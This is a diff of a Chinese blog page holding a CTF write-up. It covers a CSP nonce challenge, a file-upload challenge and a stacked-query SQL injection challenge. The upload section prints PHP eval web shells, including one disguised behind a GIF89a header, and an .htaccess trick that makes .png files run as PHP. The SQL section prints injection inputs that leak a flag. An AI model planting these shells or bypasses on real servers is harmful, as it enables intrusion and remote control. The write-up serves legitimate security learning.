@@ -1,7 +1,7 @@
 <!doctype html>
 <html class="position-relative" itemscope itemtype="https://schema.org/WebPage" lang="en"
   data-bs-theme="auto" data-palette="blue">
-  <head><script src="/assets/init/bundle.min.658d13e58d95d8bb2da082cf6e92f29c1f07475fd145926c2c401f88f9ddf545.js" integrity="sha256-ZY0T5Y2V2LstoILPbpLynB8HR1/RRZJsLEAfiPnd9UU=" crossorigin="anonymous"></script>
+  <head><script src="/assets/init/bundle.min.0815b7e73ceecd1be5ee8303df916b89a7fd1454fb835a47e3b2f9739781426f.js" integrity="sha256-CBW35zzuzRvl7oMD35Friaf9FFT7g1pH47L5c5eBQm8=" crossorigin="anonymous"></script>
 <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1">
     <title>251129每日打卡 - decimo的小窝</title>
@@ -32,7 +32,7 @@
   <meta itemprop="description" content="2025/11/29做题记录">
   <meta itemprop="datePublished" content="2025-11-29T20:43:35+08:00">
   <meta itemprop="dateModified" content="2025-11-29T20:43:35+08:00">
-  <meta itemprop="wordCount" content="308">
+  <meta itemprop="wordCount" content="321">
   <meta itemprop="keywords" content="CTF,Web">
   <meta property="og:image" content="https://decimo.top/images/logo.png"/>
   <meta name="twitter:image" content="https://decimo.top/images/logo.png"/>
@@ -44,7 +44,7 @@
     <link data-precache rel="stylesheet" href="/assets/viewer/bundle.min.16d2c85c4cae39a98f8cb7a977e95e554b174f91a5484c32605637156f49ca6b.css" integrity="sha256-FtLIXEyuOamPjLepd&#43;leVUsXT5GlSEwyYFY3FW9Jyms=" crossorigin="anonymous">
 
 
-<link rel="stylesheet" href="/css/custom.8cc5830dfc3827d70305a39f1925ac813f85effc381d9b656ac82115d234cbea.css" integrity="sha256-jMWDDfw4J9cDBaOfGSWsgT&#43;F7/w4HZtlasghFdI0y&#43;o=" crossorigin="anonymous">
+<link rel="stylesheet" href="/css/custom.730a801596309655d4fc41e9ef9ac6d3a06d0396ba0b1cea47e7418cf1013673.css" integrity="sha256-cwqAFZYwllXU/EHp75rG06BtA5a6CxzqR&#43;dBjPEBNnM=" crossorigin="anonymous">
 <script>
 (function() {
   var originalTitle = document.title;
@@ -277,25 +277,25 @@ decimo的小窝
         <div id="post-content-body"><p>2025/11/29 我决定每天打卡几道题来积少成多</p>
 
 <h2 id="afctf-2021baby_csp" data-numberify>[AFCTF 2021]BABY_CSP<a class="anchor ms-1" href="#afctf-2021baby_csp"></a></h2>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-html" data-lang="html"><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span><span style="color:#75715e">&lt;!DOCTYPE html&gt;</span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">html</span> <span style="color:#a6e22e">lang</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;en&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">charset</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;UTF-8&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">http-equiv</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;X-UA-Compatible&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;IE=edge&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">meta</span> <span style="color:#a6e22e">name</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;viewport&#34;</span> <span style="color:#a6e22e">content</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;width=device-width, initial-scale=1.0&#34;</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">title</span>&gt;BABY CSP&lt;/<span style="color:#f92672">title</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">head</span>&gt;
-</span></span><span style="display:flex;"><span>
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>    &lt;<span style="color:#f92672">a</span> <span style="color:#a6e22e">href</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;#&#39;</span> <span style="color:#a6e22e">id</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#34;btn&#34;</span>&gt;whe3e are y0u fr0m?&lt;/<span style="color:#f92672">a</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;/<span style="color:#f92672">body</span>&gt;
-</span></span><span style="display:flex;"><span>&lt;<span style="color:#f92672">script</span> <span style="color:#a6e22e">nonce</span><span style="color:#f92672">=</span><span style="color:#e6db74">29de6fde0db5686d</span>&gt;
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">btn</span>.<span style="color:#a6e22e">onclick</span> <span style="color:#f92672">=</span> () =&gt; {
-</span></span><span style="display:flex;"><span>    <span style="color:#a6e22e">location</span> <span style="color:#f92672">=</span> <span style="color:#e6db74">&#39;./?school=&#39;</span> <span style="color:#f92672">+</span> encodeURIComponent([<span style="color:#e6db74">&#39;CSU&#39;</span>, <span style="color:#e6db74">&#39;JXNU&#39;</span>, <span style="color:#e6db74">&#39;HEBNU&#39;</span>, <span style="color:#e6db74">&#39;I don\&#39;t konw :( &#39;</span>][Math.<span style="color:#a6e22e">floor</span>(<span style="color:#ae81ff">4</span> <span style="color:#f92672">*</span> Math.<span style="color:#a6e22e">random</span>())]);
-</span></span><span style="display:flex;"><span>    }
-</span></span><span style="display:flex;"><span>    &lt;/<span style="color:#f92672">script</span>&gt;&lt;<span style="color:#f92672">p</span>&gt;I don&#39;t konw :( !&lt;/<span style="color:#f92672">p</span>&gt;&lt;/<span style="color:#f92672">html</span>&gt;
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-html" data-lang="html"><span class="line"><span class="ln"> 1</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 2</span><span class="cl"><span class="cp">&lt;!DOCTYPE html&gt;</span>
+</span></span><span class="line"><span class="ln"> 3</span><span class="cl"><span class="p">&lt;</span><span class="nt">html</span> <span class="na">lang</span><span class="o">=</span><span class="s">&#34;en&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 4</span><span class="cl">
+</span></span><span class="line"><span class="ln"> 5</span><span class="cl"><span class="p">&lt;</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 6</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">charset</span><span class="o">=</span><span class="s">&#34;UTF-8&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 7</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">http-equiv</span><span class="o">=</span><span class="s">&#34;X-UA-Compatible&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;IE=edge&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 8</span><span class="cl">    <span class="p">&lt;</span><span class="nt">meta</span> <span class="na">name</span><span class="o">=</span><span class="s">&#34;viewport&#34;</span> <span class="na">content</span><span class="o">=</span><span class="s">&#34;width=device-width, initial-scale=1.0&#34;</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln"> 9</span><span class="cl">    <span class="p">&lt;</span><span class="nt">title</span><span class="p">&gt;</span>BABY CSP<span class="p">&lt;/</span><span class="nt">title</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">10</span><span class="cl"><span class="p">&lt;/</span><span class="nt">head</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">11</span><span class="cl">
+</span></span><span class="line"><span class="ln">12</span><span class="cl"><span class="p">&lt;</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">13</span><span class="cl">    <span class="p">&lt;</span><span class="nt">a</span> <span class="na">href</span><span class="o">=</span><span class="s">&#39;#&#39;</span> <span class="na">id</span><span class="o">=</span><span class="s">&#34;btn&#34;</span><span class="p">&gt;</span>whe3e are y0u fr0m?<span class="p">&lt;/</span><span class="nt">a</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">14</span><span class="cl"><span class="p">&lt;/</span><span class="nt">body</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">15</span><span class="cl"><span class="p">&lt;</span><span class="nt">script</span> <span class="na">nonce</span><span class="o">=</span><span class="s">29de6fde0db5686d</span><span class="p">&gt;</span>
+</span></span><span class="line"><span class="ln">16</span><span class="cl">    <span class="nx">btn</span><span class="p">.</span><span class="nx">onclick</span> <span class="o">=</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+</span></span><span class="line"><span class="ln">17</span><span class="cl">    <span class="nx">location</span> <span class="o">=</span> <span class="s1">&#39;./?school=&#39;</span> <span class="o">+</span> <span class="nb">encodeURIComponent</span><span class="p">([</span><span class="s1">&#39;CSU&#39;</span><span class="p">,</span> <span class="s1">&#39;JXNU&#39;</span><span class="p">,</span> <span class="s1">&#39;HEBNU&#39;</span><span class="p">,</span> <span class="s1">&#39;I don\&#39;t konw :( &#39;</span><span class="p">][</span><span class="nb">Math</span><span class="p">.</span><span class="nx">floor</span><span class="p">(</span><span class="mi">4</span> <span class="o">*</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">())]);</span>
+</span></span><span class="line"><span class="ln">18</span><span class="cl">    <span class="p">}</span>
+</span></span><span class="line"><span class="ln">19</span><span class="cl">    <span class="p">&lt;/</span><span class="nt">script</span><span class="p">&gt;&lt;</span><span class="nt">p</span><span class="p">&gt;</span>I don&#39;t konw :( !<span class="p">&lt;/</span><span class="nt">p</span><span class="p">&gt;&lt;/</span><span class="nt">html</span><span class="p">&gt;</span>
 </span></span></code></pre></div><p>这是题目的源码。页面内容为<code>wewhe3e are y0u fr0m?</code>按钮，按后会出现CSU，JXNU，HEBNU，idk之一</p>
 <p>通过题目我们可以看到考察CSP，而题目通过GET方法获得school参数从而回显到屏幕上</p>
 <p>注意到源码内包含了nonce(一次性令牌)，说明脚本必须带这个令牌，否则CSP会阻止脚本执行。</p>
@@ -320,11 +320,11 @@ decimo的小窝
 <h2 id="gxyctf-2019babyupload" data-numberify>[GXYCTF 2019]BabyUpload<a class="anchor ms-1" href="#gxyctf-2019babyupload"></a></h2>
 <p>题目给了个上传界面，这种题的逻辑就是上传个木马上去然后来控制</p>
 <p>写个一句话小马，命名为shell.php上传</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">&lt;?</span><span style="color:#a6e22e">php</span> <span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]); <span style="color:#75715e">?&gt;</span><span style="color:#960050;background-color:#1e0010">
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">&lt;?</span><span class="nx">php</span> <span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span> <span class="cp">?&gt;</span><span class="err">
 </span></span></span></code></pre></div><p>报告<code>后缀名不能有ph！</code>，那我们来试试什么格式才能上传</p>
 <p>修改为jpeg之后发现可以报告的内容不一样了<code>诶，别蒙我啊，这标志明显还是php啊</code></p>
 <p>那我们换一个payload试试</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#39;cmd&#39;</span>]);
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s1">&#39;cmd&#39;</span><span class="p">]);</span>
 </span></span></code></pre></div><p>发现可以上传<code>/var/www/html/upload/13de67143aa52630e21851a1180b233b/sh.jpeg succesfully uploaded!</code></p>
 <p>尝试一下能否直接连到我们的小马，连接不上</p>
 <p>那就得伪造了，并且得让我们的木马被当作php文件来解析，就需要尝试来上传覆盖掉<code>.htaccess</code>文件（Apache目录配置文件）</p>
@@ -337,11 +337,11 @@ decimo的小窝
 <p>参考下别的wp，改用png伪造木马</p>
 <p>修改配置文件为<code>AddType application/x-httpd-php .png</code></p>
 <p>构建payload</p>
-<div class="highlight"><pre tabindex="0" style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4;"><code class="language-php" data-lang="php"><span style="display:flex;"><span><span style="color:#a6e22e">GIF89a</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;</span><span style="color:#a6e22e">script</span> <span style="color:#a6e22e">language</span><span style="color:#f92672">=</span><span style="color:#e6db74">&#39;php&#39;</span><span style="color:#f92672">&gt;</span>
-</span></span><span style="display:flex;"><span><span style="color:#f92672">@</span><span style="color:#66d9ef">eval</span>($_POST[<span style="color:#e6db74">&#34;a&#34;</span>]);
-</span></span><span style="display:flex;"><span><span style="color:#a6e22e">show_source</span>(<span style="color:#e6db74">&#34;/flag&#34;</span>);
-</span></span><span style="display:flex;"><span><span style="color:#f92672">&lt;/</span><span style="color:#a6e22e">script</span><span style="color:#f92672">&gt;</span>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-php" data-lang="php"><span class="line"><span class="ln">1</span><span class="cl"><span class="nx">GIF89a</span>
+</span></span><span class="line"><span class="ln">2</span><span class="cl"><span class="o">&lt;</span><span class="nx">script</span> <span class="nx">language</span><span class="o">=</span><span class="s1">&#39;php&#39;</span><span class="o">&gt;</span>
+</span></span><span class="line"><span class="ln">3</span><span class="cl"><span class="o">@</span><span class="k">eval</span><span class="p">(</span><span class="nv">$_POST</span><span class="p">[</span><span class="s2">&#34;a&#34;</span><span class="p">]);</span>
+</span></span><span class="line"><span class="ln">4</span><span class="cl"><span class="nx">show_source</span><span class="p">(</span><span class="s2">&#34;/flag&#34;</span><span class="p">);</span>
+</span></span><span class="line"><span class="ln">5</span><span class="cl"><span class="o">&lt;/</span><span class="nx">script</span><span class="o">&gt;</span>
 </span></span></code></pre></div><p>然后直接访问其上传地址即可看到flag</p>
 
 <h2 id="suctf-2019easysql" data-numberify>[SUCTF 2019]EasySQL<a class="anchor ms-1" href="#suctf-2019easysql"></a></h2>
@@ -349,10 +349,10 @@ decimo的小窝
 <p>输入sleep，or，union等常见的sql语句，发现都被过滤掉了，回显Nonono.</p>
 <p>输入数字回显Array ( [0] =&gt; 1 )，字母无回显</p>
 <p>可以用<code>1;show databases;</code>来看到数据库</p>
-<pre tabindex="0"><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )
-</code></pre><p><code>1;show tables;</code>可以看到表名</p>
-<pre tabindex="0"><code>Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )
-</code></pre><p>构建payload<code>*,1</code>，得到回显<code>Array ( [0] =&gt; flag{fafb0156-ad41-47ab-96e1-5db21ec84a6b} [1] =&gt; 1 )</code></p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; ctf ) Array ( [0] =&gt; ctftraining ) Array ( [0] =&gt; information_schema ) Array ( [0] =&gt; mysql ) Array ( [0] =&gt; performance_schema ) Array ( [0] =&gt; test )
+</span></span></code></pre></div><p><code>1;show tables;</code>可以看到表名</p>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">Array ( [0] =&gt; 1 ) Array ( [0] =&gt; Flag )
+</span></span></code></pre></div><p>构建payload<code>*,1</code>，得到回显<code>Array ( [0] =&gt; flag{fafb0156-ad41-47ab-96e1-5db21ec84a6b} [1] =&gt; 1 )</code></p>
 <p>这个payload后端实际变成<code>SELECT *,1 FROM Flag</code></p>
 <p>但是只用*就没有回显。那只能猜测这是后端的小判断，这里参考下AI的答案</p>
 <blockquote>
@@ -370,8 +370,8 @@ decimo的小窝
 <h3 id="1-输入-1" data-numberify>1. 输入 1<a class="anchor ms-1" href="#1-输入-1"></a></h3>
 <p>你的输入变成 SQL：</p>
 <p>SQL</p>
-<pre tabindex="0"><code>SELECT 1 FROM Flag
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SELECT 1 FROM Flag
+</span></span></code></pre></div><ul>
 <li>查询的是常量 <code>1</code>，对每一行都返回一个 <code>1</code></li>
 <li>Flag表如果有很多行，PHP会把每行的<code>1</code>输出出来</li>
 <li>回显的是常量，不是 flag，但确实有结果返回</li>
@@ -381,8 +381,8 @@ decimo的小窝
 <h3 id="2-输入-" data-numberify>2. 输入 *<a class="anchor ms-1" href="#2-输入-"></a></h3>
 <p>SQL:</p>
 <p>SQL</p>
-<pre tabindex="0"><code>SELECT * FROM Flag
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SELECT * FROM Flag
+</span></span></code></pre></div><ul>
 <li>查询所有字段（如果Flag表只有一行，只有flag字段）</li>
 <li>理论上应该回显 flag</li>
 <li>但<strong>实际上页面没有回显</strong>，可能PHP处理<code>fetch_array</code>结果时只输出数字下标、或者因为没有多个字段不执行输出逻辑</li>
@@ -391,16 +391,16 @@ decimo的小窝
 <h3 id="3-输入-1" data-numberify>3. 输入 *,1<a class="anchor ms-1" href="#3-输入-1"></a></h3>
 <p>SQL:</p>
 <p>SQL</p>
-<pre tabindex="0"><code>SELECT *,1 FROM Flag
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">SELECT *,1 FROM Flag
+</span></span></code></pre></div><ul>
 <li>
 <p>查询所有字段（flag），再加一个字段常量1</p>
 </li>
 <li>
 <p>得到的数据是：</p>
 <p>Code</p>
-<pre tabindex="0"><code>Array( [0] =&gt; flag内容 [1]=&gt;1)
-</code></pre></li>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">Array( [0] =&gt; flag内容 [1]=&gt;1)
+</span></span></code></pre></div></li>
 <li>
 <p>回显 flag内容和1，因为结果有多列</p>
 </li>
@@ -411,19 +411,19 @@ decimo的小窝
 
 <h3 id="方案一数组长度判断" data-numberify>方案一：数组长度判断<a class="anchor ms-1" href="#方案一数组长度判断"></a></h3>
 <p>PHP</p>
-<pre tabindex="0"><code>$row = mysqli_fetch_array($result);
-if(count($row) &gt; 1){
-   foreach($row as $val) echo $val;
-}
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">$row = mysqli_fetch_array($result);
+</span></span><span class="line"><span class="ln">2</span><span class="cl">if(count($row) &gt; 1){
+</span></span><span class="line"><span class="ln">3</span><span class="cl">   foreach($row as $val) echo $val;
+</span></span><span class="line"><span class="ln">4</span><span class="cl">}
+</span></span></code></pre></div><ul>
 <li>所以只有&gt;1的列才输出（<code>*,1</code>时有2列）</li>
 </ul>
 
 <h3 id="方案二只输出数字型下标" data-numberify>方案二：只输出数字型下标<a class="anchor ms-1" href="#方案二只输出数字型下标"></a></h3>
 <p>PHP</p>
-<pre tabindex="0"><code>$row = mysqli_fetch_array($result);
-for($i=0;$i&lt;count($row);$i++) echo $row[$i];
-</code></pre><ul>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback"><span class="line"><span class="ln">1</span><span class="cl">$row = mysqli_fetch_array($result);
+</span></span><span class="line"><span class="ln">2</span><span class="cl">for($i=0;$i&lt;count($row);$i++) echo $row[$i];
+</span></span></code></pre></div><ul>
 <li>单独<code>*</code>时行可能用的是字符串下标，PHP没输出</li>
 <li><code>*,1</code>时数字下标都有值</li>
 </ul>
@@ -809,10 +809,8 @@ for($i=0;$i&lt;count($row);$i++) echo $row[$i];
 </div>
   <div class="col-12 col-lg-8 offset-0 offset-lg-1"></div>
 </div>
-<script src="/js/copy-code.js"></script>
-<link rel="stylesheet" href="/css/copy-code.css">
 </footer>
-<script data-precache src="/assets/main/bundle.min.d462af947fff0bbdb09a7b9fcb40a12bc7ca3b7ee172a4a5a35044386026b13d.js" integrity="sha256-1GKvlH//C72wmnufy0ChK8fKO37hcqSlo1BEOGAmsT0=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
+<script data-precache src="/assets/main/bundle.min.87619fbefacaa035367e3393cad6ce3508196b946cf9962924868666df3f298f.js" integrity="sha256-h2GfvvrKoDU2fjOTytbONQgZa5Rs&#43;ZYpJIaGZt8/KY8=" crossorigin="anonymous" async></script><script data-precache src="/assets/icons/bundle.min.0b03280daa4a59445b0aafc46855a2bb53b310e572534596869c33acaeec09dd.js" integrity="sha256-CwMoDapKWURbCq/EaFWiu1OzEOVyU0WWhpwzrK7sCd0=" crossorigin="anonymous" defer></script>
 <script data-precache src="/assets/viewer/bundle.min.cca398d318de9fa7816141db90f09282784fcfe0c5dabc31599b8c589932e4ae.js" integrity="sha256-zKOY0xjen6eBYUHbkPCSgnhPz&#43;DF2rwxWZuMWJky5K4=" crossorigin="anonymous" defer></script>
 <script src="/js/toc-auto.635186e6d874d0dfed4a40f65dcc71e277a9772461a22e01fd1e5aabc804694d.js" integrity="sha256-Y1GG5th00N/tSkD2Xcxx4nepdyRhoi4B/R5aq8gEaU0=" crossorigin="anonymous" defer></script>
 <script src="https://giscus.app/client.js"
